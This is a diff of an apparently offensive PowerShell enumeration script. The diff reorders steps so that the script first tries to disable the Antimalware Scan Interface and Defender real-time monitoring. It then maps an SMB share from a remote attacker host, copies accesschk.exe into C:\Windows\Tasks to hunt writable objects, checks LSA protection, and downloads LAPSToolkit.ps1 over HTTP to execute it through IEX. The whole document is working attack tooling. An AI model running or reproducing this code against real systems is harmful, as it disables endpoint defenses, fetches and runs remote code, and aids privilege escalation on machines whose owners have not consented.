@@ -75,40 +75,6 @@ function Invoke-Enum{
 
     Write-Output "==========================================="
 
-    $mode = $ExecutionContext.SessionState.LanguageMode
-    if ($mode -eq "FullLanguage") {
-        Write-Output "[+] FULL LANGUAGE ENV"
-    } else {
-        Exit
-    }
-
-    try
-    {
-        Write-Output "[+] setup share"
-        net use z: \\$RemoteIP\share\windows "" /user:$RemoteUser | Out-String
-    }
-    catch
-    {
-        Write-Output $PSItem.ToString()
-    }
-
-    try
-    {
-        Write-Output "[+] copy accesschk from share"
-        Copy-Item -Path z:\accesschk.exe -Destination c:\windows\tasks\accesschk.exe -Force
-
-        Write-Output "[+] run accesschk"
-        c:\windows\tasks\accesschk.exe -accepteula -uwcqv "Authenticated Users" *  | Out-String
-
-        # Write-Output "[+] checking for writable folders for $Env:Username"
-        # c:\windows\tasks\accesschk.exe -accepteula "$Env:Username" C:\windows -wus | Out-File "writable.txt"
-    }
-    catch
-    {
-        Write-Output $PSItem.ToString()
-    }
-
-
     try
     {
         Write-Output "[+] attempting to disable Anti Malware Scanning Interface"
@@ -134,6 +100,46 @@ function Invoke-Enum{
     {
         Write-Output "[+] attempting to disable realtime monitoring"
         Set-MpPreference -DisableRealtimeMonitoring $true | Out-String
+    }
+    catch
+    {
+        Write-Output $PSItem.ToString()
+    }
+
+    $mode = $ExecutionContext.SessionState.LanguageMode
+    if ($mode -eq "FullLanguage") {
+        Write-Output "[+] FULL LANGUAGE ENV"
+    } else {
+        Exit
+    }
+
+    try
+    {
+        Write-Output "[+] setup share"
+        net use z: \\$RemoteIP\share\windows "" /user:$RemoteUser | Out-String
+    }
+    catch
+    {
+        Write-Output $PSItem.ToString()
+    }
+
+    try
+    {
+        Write-Output "[+] copy accesschk from share"
+        Copy-Item -Path z:\accesschk.exe -Destination c:\windows\tasks\accesschk.exe -Force
+    }
+    catch
+    {
+        Write-Output $PSItem.ToString()
+    }
+
+    try
+    {
+        Write-Output "[+] run accesschk"
+        c:\windows\tasks\accesschk.exe -accepteula -uwcqv "Authenticated Users" *  | Out-String
+
+        Write-Output "[+] checking for writable folders for $Env:Username"
+        c:\windows\tasks\accesschk.exe -accepteula "$Env:Username" C:\windows -wus | Out-File "writable.txt"
     }
     catch
     {
@@ -186,11 +192,11 @@ function Invoke-Enum{
         $prop = Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
         if ($prop.RunAsPPL -eq 1)
         {
-            Write-Output "`t[!] LSASS is enabled"
+            Write-Output "[!] LSASS is enabled"
         }
         else
         {
-            Write-Output "[!] LSAASS NOT enabled"
+            Write-Output "[!] LSASS NOT enabled"
         }
     }
     catch
@@ -199,16 +205,15 @@ function Invoke-Enum{
     }
 
 
-
-    write-Output "`t[+] downloading LAPSTookkit"
     try 
     {
+        Write-Output "[+] downloading LAPSTookkit"
         (new-object system.net.webclient).downloadstring("http://$RemoteIP/LAPSToolkit.ps1") | IEX
         Get-LAPSComputers | Out-String
     }
     catch 
     {
-        Write-Output "`t[!] LAPSToolkit FAILED"
+        Write-Output "[!] LAPSToolkit FAILED"
     }
 
     Write-Output "==========================================="
